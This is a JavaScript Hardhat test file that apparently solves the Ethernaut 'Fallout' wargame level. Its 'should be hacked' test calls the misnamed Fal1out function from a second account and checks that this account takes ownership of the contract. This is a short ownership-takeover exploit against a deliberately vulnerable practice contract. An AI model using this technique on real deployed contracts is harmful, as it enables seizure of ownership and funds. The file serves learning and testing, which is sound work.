import { loadFixture, ethers, expect } from "./setup";

const _ticketPrice = ethers.parseEther("0.1");
const _duration = 10;
const _ownerCommission = 2;

describe("Fallout contract", function() {
    async function deploy() {
		const owner = (await ethers.getSigners())[0];
        const newOwner = (await ethers.getSigners())[1];

        const Factory = await ethers.getContractFactory("Fallout");
        const contract = await Factory.deploy();
        await contract.waitForDeployment();

        return {contract, owner, newOwner};
    }

    it ("should be depoyed", async function() {
        const {contract} = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;
    });

    it ("should be hacked", async function() {
        const {contract, owner, newOwner} = await loadFixture(deploy);
        const ownerAddressBefore = await contract.owner();
        expect(ownerAddressBefore).to.be.eq(ethers.ZeroAddress);

        await contract.connect(newOwner).Fal1out({value: ethers.parseEther("0.0001")})
        const ownerAddressAfter = await contract.owner();

        expect(ownerAddressAfter).to.be.eq(newOwner.address);

    });
})